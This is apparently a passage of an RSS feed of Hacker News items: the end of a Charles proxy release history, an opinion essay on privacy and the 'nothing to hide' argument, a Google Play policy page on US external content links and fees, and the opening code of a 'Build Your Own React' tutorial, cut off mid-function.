		<dt>27 Jun 2012</dt>
	


<dd><p>Charles 3.7 beta 2 has been released. This changes the SSL signing for Charles on Mac OS X to use Apple's new Developer ID code-signing. <span><a href="http://www.charlesproxy.com/download/beta/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>8 Dec 2011</dt>
	


<dd><p>Charles v3.6.5 released including bug fixes and minor changes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>15 Nov 2011</dt>
	


<dd><p>Charles v3.6.4 released including major bug fixes and enhancements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>5 Sep 2011</dt>
	


<dd><p>Charles v3.6.3 released including minor bug fixes. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>24 Aug 2011</dt>
	


<dd><p>Charles v3.6.1 released including minor enhancements and bug fixes. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>18 Aug 2011</dt>
	


<dd><p>Charles v3.6 released including new features, enhancements and bug fixes. New features include HAR and SAZ file import. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>17 Aug 2010</dt>
	


<dd><p>Charles v3.5.2 released including bug fixes and minor new features. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>1 Jan 2010</dt>
	


<dd><p>Charles 3.5.1 released. Minor bug fixes. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>23 Dec 2009</dt>
	


<dd><p>Charles 3.5 released. Major new features, bug fixes and enhancements.</p></dd>
						
							
		<dt>17 Oct 2009</dt>
	


<dd><p>Charles 3.4.1 released. Minor features and bug fixes.</p></dd>
						
							
		<dt>27 Sep 2009</dt>
	


<dd><p>Charles 3.4 released. Major changes especially to SSL.</p></dd>
						
							
		<dt>11 May 2009</dt>
	


<dd><p>New website launched. Follow <a href="http://twitter.com/charlesproxy" target="_blank" rel="noopener noreferrer">@charlesproxy</a> on Twitter. Say hi in San Francisco when I'm there for WWDC!</p></dd>
						
							
		<dt>7 Mar 2009</dt>
	


<dd><p>Charles 3.3.1 released. Minor new features and bug fixes. Experimental 64 bit Windows support. <span><a href="http://www.charlesproxy.com/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>15 Feb 2009</dt>
	


<dd><p>Charles 3.3 released. Major new features. Download</p></dd>
						
							
		<dt>24 Sep 2008</dt>
	


<dd><p>Charles Autoconfiguration add-on for Mozilla Firefox adds support for Firefox 3.1</p></dd>
						
							
		<dt>23 Sep 2008</dt>
	


<dd><p>Charles 3.2.3 released. Minor new features and bug fixes.</p></dd>
						
							
		<dt>6 Sep 2008</dt>
	


<dd><p>Charles 3.2.2 released. Minor new features and bug fixes.</p></dd>
						
							
		<dt>17 Apr 2008</dt>
	


<dd><p>Charles 3.2.1 released. Minor new features and bug fixes.</p></dd>
						
							
		<dt>24 Mar 2008</dt>
	


<dd><p>Charles 3.2 released. Major new features. Release Notes</p></dd>
						
							
		<dt>28 Jan 2008</dt>
	


<dd><p>Charles 3.2 public beta released. Download and more information on my blog.</p></dd>
						
							
		<dt>19 Dec 2007</dt>
	


<dd><p>Charles 3.1.4 released. Bug fixes and minor new features.</p></dd>
						
							
		<dt>21 Nov 2007</dt>
	


<dd><p>Charles Mozilla Firefox add-on updated for compatibility with Firefox 3.0.</p></dd>
						
							
		<dt>12 Nov 2007</dt>
	


<dd><p>Charles 3.1.3 released. Minor bug fixes, minor new features.</p><ul><li>Chart tab now includes charts for sizes, durations and types</li><li>Request &amp; Response can now be displayed combined on one split-panel</li><li>SSL handshake and certificate errors are now displayed in the tree</li></ul></dd>
						
							
		<dt>29 Aug 2007</dt>
	


<dd><p>Charles 3.1.2 released. Minor bug fixes.</p></dd>
						
							
		<dt>27 Aug 2007</dt>
	


<dd><p>Charles 3.1.1 released. Minor bug fixes.</p></dd>
						
							
		<dt>13 Aug 2007</dt>
	


<dd><p>Charles 3.1 released.</p></dd>
						
							
		<dt>22 May 2007</dt>
	


<dd><p>Charles 3.0.4 released. Fixes SSL bug on Java 1.4.</p></dd>
						
							
		<dt>14 May 2007</dt>
	


<dd><p>Charles 3.0.3 re-released. Fixes launch bug on computers that haven't used Charles before.</p></dd>
						
							
		<dt>12 May 2007</dt>
	


<dd><p>Charles 3.0.3 released. Various improvements and minor bug fixes.</p></dd>
						
							
		<dt>23 Apr 2007</dt>
	


<dd><p>Charles 3.0.2 released. Minor bug fixes and improvements.</p></dd>
						
							
		<dt>28 Mar 2007</dt>
	


<dd><p>Charles 3.0.1 released. Minor bug fixes.</p></dd>
						
							
		<dt>24 Mar 2007</dt>
	


<dd><p>Charles 3.0 released. Major new features and improvements</p></dd>
						
							
		<dt>7 Mar 2007</dt>
	


<dd><p>Charles 3.0 public beta released.</p></dd>
						
							
		<dt>27 Feb 2007</dt>
	


<dd><p>Charles v2.6.4 release. Minor bug fixes:</p><ul><li>IBM JDK compatibility</li><li>Improved malformed Referer header support</li></ul></dd>
						
							
		<dt>17 Feb 2007</dt>
	


<dd><p>Charles v2.6.3 release. Minor bug fixes:</p><ul><li>Fixed Port Forwarding fault introduced in v2.6.2</li></ul></dd>
						
							
		<dt>1 Feb 2007</dt>
	


<dd><p>Charles v2.6.2 release. Major improvements and bug fixes including:</p><ul><li>No more recording limits. Large responses are now saved to temporary files, reducing memory usage.</li><li>MTU support in the throttle settings</li><li>AMF3 / Flex 2 bug fixes</li></ul></dd>
						
							
		<dt>2 Dec 2006</dt>
	


<dd><p>Charles v2.6.1 release. Minor bug fixes and improvements:</p><ul><li>SOAP information visible while response is still loading</li><li>AMF3 externalizable object parsing regression fixed</li><li>AMF view for AMF3/Flex messages simplified to hide Flex implementation details</li></ul></dd>
						
							
		<dt>27 Nov 2006</dt>
	


<dd><p>Charles v2.6 release. Major improvements and bug fixes including:</p><ul><li>Major UI overhaul</li><li>JSON and JSON-RPC support</li><li>SOAP support</li></ul></dd>
						
							
		<dt>20 Sep 2006</dt>
	


<dd><p>Charles v2.5 release. Major improvements and bug fixes including:</p><ul><li>Major UI improvements</li><li>Support for new filetypes including FLV</li><li>Major improvements to AMF / Flash remoting viewer</li><li>Thank you to everyone who made suggestions and participated in the long testing process.</li></ul></dd>
						
							
		<dt>1 Jun 2006</dt>
	


<dd><p>Charles v2.4.2 release. Minor improvements and bug fixes including:</p><ul><li>Support for request body compression (used by web services)</li><li>Fix for parsing of AMFPHP responses</li><li>Improvements to AMF viewer</li></ul></dd>
						
							
		<dt>6 May 2006</dt>
	


<dd><p>Charles v2.4.1 release. Minor improvements and bug fixes including:</p><ul><li>Firefox extension improved</li><li>AMF 0 and AMF 3 parsing improved</li><li>Look and Feel changes to give a greater (and more consistent) range of font sizes in the Charles look and feel</li><li>SSL error reporting improved when a connection cannot be made to a remote host</li><li>Port Forwarding tool and Reverse Proxy tool re-bind exception fixed</li></ul></dd>
						
							
		<dt>26 Apr 2006</dt>
	


<dd><p>Charles v2.4 release. Major new features, improvements and bug fixes including:</p><ul><li>AMF 3 support</li><li>SSL support for IBM JDK (thanks to Lance Bader for helping solve this)</li><li>Automatic Update Checking</li><li>Documentation wiki open to public</li></ul></dd>
						
							
		<dt>25 Mar 2006</dt>
	


<dd><p>Charles v2.3 release. Major improvements and bug fixes including:</p><ul><li>Proxy implementation improvements including better handling of keep-alive connections</li><li>SOCKS proxy added, so any SOCKSified application can now run through Charles</li><li>External proxies configuration improvements including authentication</li><li>Flash Remoting / AMF viewer improvements</li><li>Dynamic proxy port support, for multiuser systems</li></ul></dd>
						
							
		<dt>5 Nov 2005</dt>
	


<dd><p>Charles v2.2.1 release. Minor improvements and bug fixes including:</p><ul><li>Further improved Firefox proxy configuration</li><li>Port Forwarding enhancements including port ranges and UDP forwarding</li><li>Bug fixes for Reverse Proxy and AMF viewer</li></ul></dd>
						
							
		<dt>5 Oct 2005</dt>
	


<dd><p>Charles v2.2 released. Major enhancements and bug fixes including:</p><ul><li>Improved Firefox proxy configuration</li><li>XML viewer improvements</li><li>Line numbers displayed in ASCII viewer</li></ul></dd>
						
							
		<dt>2 Sep 2005</dt>
	


<dd><p>Charles v2.1 released. Major new features and enhancements including:</p><ul><li>Automatic Firefox proxy configuration</li><li>Formatted form posts and query string information</li><li>Parsing of SWF and AMF (Flash Remoting) binary formats</li></ul></dd>
						
							
		<dt>18 Jun 2005</dt>
	


<dd><p>Charles v2.0 released. Major enhancements and improvements.</p></dd>
						
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Deviancy Signal: Having "Nothing to Hide" Is a Threat to Us All (152 pts)]]></title>
            <link>https://thompson2026.com/blog/deviancy-signal/</link>
            <guid>46333830</guid>
            <pubDate>Sat, 20 Dec 2025 05:24:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://thompson2026.com/blog/deviancy-signal/">https://thompson2026.com/blog/deviancy-signal/</a>, See on <a href="https://news.ycombinator.com/item?id=46333830">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p>There's a special kind of contempt I reserve for the person who says, "I have nothing to hide." It's not the gentle pity you'd have for the naive. It's the cold, hard anger you hold for a collaborator. Because these people aren't just surrendering their own liberty. They're instead actively forging the chains for the rest of us. They are a threat, and I think it's time they were told so.</p>
<p>Their argument is a "pathology of the present tense," a failure of imagination so profound it borders on a moral crime. What they fail to understand is that by living as an open book, they are creating the most dangerous weapon imaginable: a baseline of "normalcy." They are steadily creating a data profile for the State's machine, teaching its algorithms what a "good, transparent citizen" looks like. Every unencrypted text, every thoughtless search, every location-tagged post is another brick in the wall of their own cage.</p>
<p>And then comes the part they can't (or won't) fathom. The context shifts. The political winds change. The Overton window slams shut on a belief they once held. A book they read is declared subversive. A group they donated to is re-classified as extremist. A joke they told is now evidence of a thoughtcrime. Suddenly, for the first time, they have something to hide.</p>
<p>So they reach for the tools of privacy. They download the encrypted messenger. They fire up the VPN. They start to cover their tracks.</p>
<p>And in that single act, they trigger the <strong>Deviancy Signal</strong>.</p>
<p>Their first attempt at privacy, set against their own self-created history of total transparency, is a screaming alarm to the grown surveillance machine. It's the poker player with a perfect tell, or the nocturnal animal suddenly walking in daylight. Their very attempt to become private is the most public and suspicious act they could possibly commit. They have not built an effective shield, as they have painted a target on their own back. By the time they need privacy, their own history has made seeking it an admission of guilt.</p>
<p>But the damage doesn't end with your own self-incrimination. It radiates outward, undoing the careful work of everyone around you. Think of your friend who has practiced perfect operational security, who has spent years building a private life to ensure they have no baseline for the state to analyze. They are a ghost in the machine. Then they talk to you. Your unshielded phone becomes the listening device they never consented to. You take their disciplined effort to stay invisible and you shout it into a government microphone, tying their identity to yours in a permanent, searchable log. You don't just contrast with their diligence; you actively dismantle it.</p>
<p>On a societal scale, this inaction becomes a collective betrayal. The power of the <strong>Deviancy Signal</strong> is directly proportional to the number of people who live transparently. Every person who refuses to practice privacy adds another gallon of clean, clear water to the state's pool, making any ripple of dissent ... any deviation ... starkly visible. This is not a passive choice. By refusing to help create a chaotic, noisy baseline of universal privacy, you are actively making the system more effective. You are failing to do your part to make the baseline all deviant, and in doing so, you make us all more vulnerable.</p>
<p>There is only one way to disarm this weapon: we must destroy its premise. We must obliterate the baseline. The task is not merely to hide, but to make privacy the default, to make encryption a reflex, to make anonymity a universal right. We must create so much noise that a signal is impossible to find. Our collective goal must be to make a "normal" profile so rare that the watchers have nothing to compare us to. <strong>We must all become deviations</strong>.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Android introduces $2-4 install fee and 10–20% cut for US external content links (198 pts)]]></title>
            <link>https://support.google.com/googleplay/android-developer/answer/16470497?hl=en</link>
            <guid>46333734</guid>
            <pubDate>Sat, 20 Dec 2025 05:00:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://support.google.com/googleplay/android-developer/answer/16470497?hl=en">https://support.google.com/googleplay/android-developer/answer/16470497?hl=en</a>, See on <a href="https://news.ycombinator.com/item?id=46333734">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="hcfe-content" role="main">                   <article class="page" sc-render-smart-button="false" itemscope=""> <div data-stats-ve="35"><div>
  <p>Developers currently using links to app downloads or transactions need to enroll in this program and meet these requirements by January 28, 2026.</p>
</div>

<div>
  <p><a id="in_the_future" name="in_the_future"></a>In the future, Google intends to apply a service fee on successful transactions and downloads completed via external content links. At this time, however, Google is not assessing these fees and is therefore not requiring developers in this program to report these transactions or downloads to Google.</p>
</div>

<p>The external content links program allows developers of Google Play-distributed apps to link users in the United States to external content, including to purchase in-app digital items or to download an app whose install and updates are not managed by Google Play. Additionally, developers can offer external links to purchase in-app digital items in lieu of or alongside Google Play Billing.</p>

<p>Developers must meet the eligibility and requirements set out below, and successfully complete their enrollment in this program prior to using external content links.<br>
  &nbsp;</p>

<h2>Availability</h2>

<p>This program is available in the US in connection with the <a href="https://support.google.com/googleplay/android-developer/answer/15582165" rel="noopener">US District Court's order</a>. Google reserves the right to modify or terminate this program, including as a result of any changes to or termination of the US District Court's order.</p>

<h2><a id="ecl_requirements" name="ecl_requirements"></a>Requirements</h2>

<p>Developers participating in this program must comply with the following requirements:</p>

<ul>
  <li>Enroll and get approval for your app(s) and any linked external apps in the external content links program as explained below.</li>
  <li>Limit external content links to users in the US and its territories.</li>
  <li>Ensure all Play Apps enrolled in this program and any linked external apps comply with <a href="https://play.google/developer-content-policy/" rel="noopener" target="_blank">Play Developer Policies</a>, with the exception of policies that are not applicable to linked apps, such as the <a href="https://support.google.com/googleplay/android-developer/answer/9858738" rel="noopener">Payments policy</a>.</li>
  <li>If using Google Play Billing with this program, all users must be able to access Google Play Billing in a consistent and reliable manner.</li>
  <li>Integrate with the external content links APIs, which surface&nbsp;an information screen, enable parental controls, and facilitate transaction reporting once required.</li>
  <li>Provide customer support for users completing transactions or downloading apps outside of Play and provide a process to dispute unauthorized transactions.</li>
  <li>Offer refund methods for users completing transactions outside of Play, unless the user was clearly informed that the transaction is non-refundable before completing the purchase.</li>
  <li>All external content links must meet the <a href="#destination_requirements" rel="noopener">destination requirements</a> as outlined below.</li>
  <li><a href="#in_the_future" rel="noopener">Once required</a>, pay Google the applicable fees for qualifying transactions or app installs that are concluded outside the app following the external content link as outlined below.</li>
</ul>

<h2><a id="destination_requirements" name="destination_requirements"></a><span>Destination requirements</span></h2>

<div>
  <p>All external content destinations must meet the following requirements:</p>

  <div>
    <ul>
      <li>External content links to purchase in-app offers can be shown on a browser, in a webview or another app store already installed on the user’s device.</li>
      <li>For user safety, external content links to download apps can link to the download of apps on a browser or another app store already installed on the user’s device. The destination page cannot contain any downloads that have not been approved for the ECL program.</li>
      <li>External content links must inform the user about the destination page and its purpose in the app before linking out.</li>
      <li>External content URLs must not contain a user’s personally identifiable information without sufficient security or encryption techniques in order to protect the user’s data.</li>
      <li>External content links must not redirect or mislead users to a different destination page than presented in your external link, or present other false or deceptive information.</li>
    </ul>
  </div>
</div>

<div>
  <p>In addition, to ensure a good user experience and keep Play’s users safe, any destination for links to download need to:</p>

  <div>
      <ul>
        <li>Have the right to distribute the apps available at the destination.</li>
        <li>Clearly and visibly publish details for the app that is to be downloaded. The app details must include at least app name, app icon, app description, app version number, app download size, and information about the app developer.</li>
        <li>Only install an app with the user’s knowledge and at the explicit direction of the user for each app, through a clearly labeled UI component visible to the user.</li>
        <li>Provide direct, publicly accessible customer support to end users through readily accessible communication channels.</li>
        <li>Have user data policies for their users.</li>
        <li>Be responsible for adhering to all applicable local regulations, laws and ordinances.</li>
      </ul>
    </div>
</div>

<h2><span>Play Ser</span><span>vice Fees</span></h2>

<div>
  <p>In the future, Google intends to apply a service fee on successful transactions and downloads completed via external content links. At this time, however, Google is not assessing these fees and is therefore not requiring developers in this program to report these transactions or downloads to Google.</p>
</div>

<p>Like our standard service fees, the fees associated with the external content links program reflect the <a href="https://play.google/howplayworks/" rel="noopener" target="_blank">value provided by Android and Play and support our continued investments across Android and Play</a>. The following fees apply when a user completes any transactions or any app installs <strong>within 24 hours of following an external content link</strong>:</p>

<ul>
  <li><strong>In-app item purchases</strong>: 10% for auto-renewing subscriptions and 20% for other offers of in-app digital features and services. Transactions for the first $1M (USD) of total developer earnings annually will be charged at 10%.</li>
  <li><strong>App download event</strong>: A fixed fee (subject to periodic adjustments) per install based on the app category of the linked external app being installed. The linked app category must be declared as part of transaction reporting.
    <ul>
      <li>Games: $3.65</li>
      <li>Apps: $2.85</li>
    </ul>
  </li>
</ul>

<h2>Eligibility</h2>

<p>In order to be eligible for this program, your app(s) must be a mobile or tablet app or game serving users in the United States and its territories.</p>

<p>Please note that eligibility and requirements are subject to change.</p>

<h2>Enroll your app in the external content links program</h2>

<p>To enroll in the external content links program, you must complete the following steps:</p>

<ol>
  <li>Review the requirements on this page to determine if your app(s) meets all the eligibility criteria.</li>
  <li>Complete the <a href="https://support.google.com/googleplay/android-developer/contact/external_content_links" rel="noopener">external content links declaration form</a> and complete any onboarding steps required to enroll in the program through Google's support team.</li>
  <li>Integrate the <a href="https://developer.android.com/google/play/billing/externalcontentlinks" rel="noopener" target="_blank">external links APIs</a> in your app for external links prior to linking users out to purchase in-app digital items or to download an external app.</li>
  <li>Enroll your app(s) that will be using external content links through Play Console on the <strong>External</strong> <strong>content</strong> <strong>links</strong> page (<strong>Settings</strong> &gt; <strong>External</strong> <strong>content</strong> <strong>links</strong>).</li>
  <li>If you are using external content links to link users to download an app, complete the following steps in Play Console:
    <div>
      <h2>a. Register and submit all versions of the linked external app(s)</h2>

      <div>
        <p>i. Open <a href="https://play.google.com/console/developers" rel="noopener" target="_blank">Play Console</a> and go to the Register external apps page (<strong>Settings</strong> &gt; <strong>Register</strong> <strong>external</strong> <strong>apps</strong>).</p>

        <p>ii. External apps submitted for registration are processed as soon as possible, subject to our standard review processes, and may result in review times of up to 7 days or longer in exceptional cases.</p>
      </div>
    </div>

    <div>
      <p>b. Declare all external content links to external app(s) in your Play app(s)</p>

      <div>
          <p>i. Open <a href="https://play.google.com/console/developers" rel="noopener" target="_blank">Play Console</a> and go to the External apps declaration (<strong>Monitor and improve</strong> &gt; <strong>Policy and programs</strong> &gt; <strong>App Content</strong>).</p>

          <p>ii. Input the package name of the external app. Note: only external apps that have been successfully registered will show up in the drop-down list. See <a href="#why_cant_I_select_the_external_app_when_declaring_external_content_links" rel="noopener">this FAQ</a> for more information.</p>

          <p>iii. Provide all user facing landing page URLs for the external app downloads.</p>

          <p>iv. Provide all download links that are being used to distribute the external app APK to users.</p>
        </div>
    </div>

    <div>
      <h2>c. When your external app(s) are updated, submit all updated versions and APKs of the linked external app(s)</h2>

      <div>
          <p>i. Open <a href="https://play.google.com/console/developers" rel="noopener" target="_blank">Play Console</a> and go to the Register external apps page (<strong>Settings</strong> &gt; <strong>Register</strong> <strong>external</strong> <strong>apps</strong>).</p>

          <p>ii. Find the external app that is being updated and click <strong>Manage</strong> in the table.</p>

          <p>iii. Ensure the external app is approved before linking users to the updated versions or APKs.</p>
        </div>
    </div>
  </li>
  <li>
    <p><a href="#in_the_future" rel="noopener">Once required</a>, keep track of all transactions, including $0 transactions resulting from free trial purchases, and app installs completed through external content links for reporting through the <a href="https://developer.android.com/google/play/billing/externalcontentlinks" rel="noopener" target="_blank">external links APIs</a>.</p>
  </li>
</ol>

<p>If you have any additional questions, you can contact our support team <a href="https://support.google.com/googleplay/android-developer/contact/billing_and_linkouts_program_q" rel="noopener">here</a>.</p>

<p><a href="https://support.google.com/googleplay/android-developer/contact/external_content_links" target="_blank" rel="noopener">Open declaration form</a></p>

<h2><a id="ecl_program_faq" name="ecl_program_faq"></a>Frequently asked questions</h2>

<div>
  <p>Can I utilize external content links for users in other geographies beyond the US?</p>

  <div>
    <p>This program is limited to users in the United States and its territories. Developers from other regions can enroll in the program to offer external links to users in the United States and its territories. If you are looking to offer external content links for users in the EEA, you will need to enroll in the <a href="https://support.google.com/googleplay/android-developer/answer/12570971" rel="noopener">External Offers Program</a>.</p>
  </div>
</div>

<div>
  <p>Are game developers eligible for this program?</p>

  <div>
    <p>Yes, both game and app developers are eligible to apply and participate in the external content links program.</p>
  </div>
</div>

<div>
  <p>Are all developers required to enroll in the external content links program?</p>

  <div>
    <p>No, this is an optional program. If you do not wish to link users to external content for purchases or downloads, no action is required.</p>
  </div>
</div>

<div>
  <p>Is there a limit to the number of external content links I am allowed to have in my app?</p>

  <div>
    <p>No, there is no limit on the number of external content links in your app.</p>
  </div>
</div>

<div>
  <p>What types of transactions are we required to report when using external content links to link users to purchase in-app digital items?</p>

  <div>
    <p>Once required, you will need to report all transactions, including $0 transactions resulting from free trial purchases, that are concluded after following an external content link. This applies to all transactions, including new purchases, rentals, renewals, top-ups, upgrades, downgrades, and others. Please see the external links integration guide for how to report these transactions.</p>
  </div>
</div>

<div>
  <p><a id="why_cant_I_select_the_external_app_when_declaring_external_content_links" name="why_cant_I_select_the_external_app_when_declaring_external_content_links"></a>Why can’t I select the external app when declaring external content links in the Play Console?</p>

  <div>
    <p>External apps must be successfully registered before you can declare the external content links that link users to an external app download. Please make sure that the external app has been submitted for registration and addressed any issues that may have been identified during the registration and review process. You can check to see if there are any issues in <a href="https://play.google.com/console/developers" rel="noopener" target="_blank">Play Console</a> on the <strong>Publishing</strong> <strong>overview</strong> page before you submit your external app registration or on the <strong>Policy</strong> <strong>status</strong> page after you have submitted your external app for review.</p>
  </div>
</div>

<div>
  <p>Do I have to register the external apps that I link to?</p>

  <div>
    <p>Yes, registration of all external apps on the linked destination page is required. This process enables Google to check that all external apps linked to using external content links are compliant with <a href="https://play.google/developer-content-policy/" rel="noopener" target="_blank">Play Developer Policies</a>, with the exception of policies that are not applicable to linked apps, such as the <a href="https://support.google.com/googleplay/android-developer/answer/9858738" rel="noopener">Payment policies</a>.</p>
  </div>
</div>

<div>
  <p>Can I make external content links available for only some of my apps?</p>

  <div>
    <p>Yes, after successfully signing up to the external content links program, you can select which apps you want to enroll for external content links at any given time using the Play Console.</p>
  </div>
</div>

<div>
  <p>How can I notify Google of any changes to my app package enrollment selections?</p>

  <div>
    <p>You can change the external content link program enrollment for a given app package through your <a href="https://developer.android.com/google/play/billing/alternative#configuring-with-user-choice" rel="noopener" target="_blank">Play Console settings</a>. Any updates will be effective immediately, including changes to applicable service fees.</p>
  </div>
</div>

<div>
  <h2>What are the steps to integrate with the external links APIs?</h2>

  <div>
    <p>It is easy to extend your existing integration with Google Play’s billing system to utilize external links APIs. The APIs are built upon the same design patterns and principles as our Play Billing Library and Play Developer APIs. This means they are compatible with your existing designs and will be familiar to your teams. In our developer integration guide, we provide detailed guidelines and resources on how to get started. We welcome developer feedback on these APIs and any additional resources that would be helpful.</p>

    <p>If you have any questions or feedback about the external links APIs, please contact us <a href="https://support.google.com/googleplay/android-developer/contact/billing_and_linkouts_program_q" rel="noopener">here</a>.</p>
  </div>
</div>

<div>
  <p>If I am already participating in an alternative billing program, can I also participate in the external content links program?</p>

  <div>
    <p>Yes, developers can take advantage of both programs if they so choose and if they satisfy requirements of both programs and meet the eligibility criteria for both. To participate in the external content links program and start promoting external links, you need to successfully complete the signup process and comply with all the program requirements.</p>
  </div>
</div>

<div>
  <p>Can I use Google Play's billing system alongside external content links?</p>

  <div>
    <p>Yes, developers can take advantage of Google Play's billing system while also participating in the external content links program. To participate in the external content links program and start promoting external links, you need to successfully complete the signup process and comply with all the program requirements.</p>
  </div>
</div>
</div>         <div data-stats-id="16470497" data-stats-ve="20" data-stats-visible-imp="" id="article-survey-container"><h2 tabindex="-1">Was this helpful?</h2><p>How can we improve it?</p></div>    </article>            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Build Your Own React (149 pts)]]></title>
            <link>https://pomb.us/build-your-own-react/</link>
            <guid>46332526</guid>
            <pubDate>Sat, 20 Dec 2025 00:16:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pomb.us/build-your-own-react/">https://pomb.us/build-your-own-react/</a>, See on <a href="https://news.ycombinator.com/item?id=46332526">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><pre><code><div><p><span>function</span><span> </span><span>createElement</span><span>(</span><span>type</span><span>,</span><span> props</span><span>,</span><span> </span><span>...</span><span>children</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>return</span><span> </span><span>{</span></p></div><div><p><span>    type</span><span>,</span></p></div><div><p><span>    </span><span>props</span><span>:</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>...</span><span>props</span><span>,</span></p></div><div><p><span>      </span><span>children</span><span>:</span><span> children</span><span>.</span><span>map</span><span>(</span><span>child</span><span> </span><span>=&gt;</span></p></div><div><p><span>        </span><span>typeof</span><span> child </span><span>===</span><span> </span><span>"object"</span></p></div><div><p><span>          </span><span>?</span><span> child</span></p></div><div><p><span>          </span><span>:</span><span> </span><span>createTextElement</span><span>(</span><span>child</span><span>)</span></p></div><div><p><span>      </span><span>)</span><span>,</span></p></div><div><p><span>    </span><span>}</span><span>,</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>createTextElement</span><span>(</span><span>text</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>return</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>type</span><span>:</span><span> </span><span>"TEXT_ELEMENT"</span><span>,</span></p></div><div><p><span>    </span><span>props</span><span>:</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>nodeValue</span><span>:</span><span> text</span><span>,</span></p></div><div><p><span>      </span><span>children</span><span>:</span><span> </span><span>[</span><span>]</span><span>,</span></p></div><div><p><span>    </span><span>}</span><span>,</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>createDom</span><span>(</span><span>fiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>const</span><span> dom </span><span>=</span></p></div><div><p><span>    fiber</span><span>.</span><span>type </span><span>==</span><span> </span><span>"TEXT_ELEMENT"</span></p></div><div><p><span>      </span><span>?</span><span> document</span><span>.</span><span>createTextNode</span><span>(</span><span>""</span><span>)</span></p></div><div><p><span>      </span><span>:</span><span> document</span><span>.</span><span>createElement</span><span>(</span><span>fiber</span><span>.</span><span>type</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>updateDom</span><span>(</span><span>dom</span><span>,</span><span> </span><span>{</span><span>}</span><span>,</span><span> fiber</span><span>.</span><span>props</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>return</span><span> dom</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>const</span><span> </span><span>isEvent</span><span> </span><span>=</span><span> </span><span>key</span><span> </span><span>=&gt;</span><span> key</span><span>.</span><span>startsWith</span><span>(</span><span>"on"</span><span>)</span></p></div><div><p><span>const</span><span> </span><span>isProperty</span><span> </span><span>=</span><span> </span><span>key</span><span> </span><span>=&gt;</span></p></div><div><p><span>  key </span><span>!==</span><span> </span><span>"children"</span><span> </span><span>&amp;&amp;</span><span> </span><span>!</span><span>isEvent</span><span>(</span><span>key</span><span>)</span></p></div><div><p><span>const</span><span> </span><span>isNew</span><span> </span><span>=</span><span> </span><span>(</span><span>prev</span><span>,</span><span> next</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>key</span><span> </span><span>=&gt;</span></p></div><div><p><span>  prev</span><span>[</span><span>key</span><span>]</span><span> </span><span>!==</span><span> next</span><span>[</span><span>key</span><span>]</span></p></div><div><p><span>const</span><span> </span><span>isGone</span><span> </span><span>=</span><span> </span><span>(</span><span>prev</span><span>,</span><span> next</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>key</span><span> </span><span>=&gt;</span><span> </span><span>!</span><span>(</span><span>key </span><span>in</span><span> next</span><span>)</span></p></div><div><p><span>function</span><span> </span><span>updateDom</span><span>(</span><span>dom</span><span>,</span><span> prevProps</span><span>,</span><span> nextProps</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>//Remove old or changed event listeners</span></p></div><div><p><span>  Object</span><span>.</span><span>keys</span><span>(</span><span>prevProps</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isEvent</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span></p></div><div><p><span>      </span><span>key</span><span> </span><span>=&gt;</span></p></div><div><p><span>        </span><span>!</span><span>(</span><span>key </span><span>in</span><span> nextProps</span><span>)</span><span> </span><span>||</span></p></div><div><p><span>        </span><span>isNew</span><span>(</span><span>prevProps</span><span>,</span><span> nextProps</span><span>)</span><span>(</span><span>key</span><span>)</span></p></div><div><p><span>    </span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>forEach</span><span>(</span><span>name</span><span> </span><span>=&gt;</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>const</span><span> eventType </span><span>=</span><span> name</span></p></div><div><p><span>        </span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span></p></div><div><p><span>        </span><span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span></p></div><div><p><span>      dom</span><span>.</span><span>removeEventListener</span><span>(</span></p></div><div><p><span>        eventType</span><span>,</span></p></div><div><p><span>        prevProps</span><span>[</span><span>name</span><span>]</span></p></div><div><p><span>      </span><span>)</span></p></div><div><p><span>    </span><span>}</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>// Remove old properties</span></p></div><div><p><span>  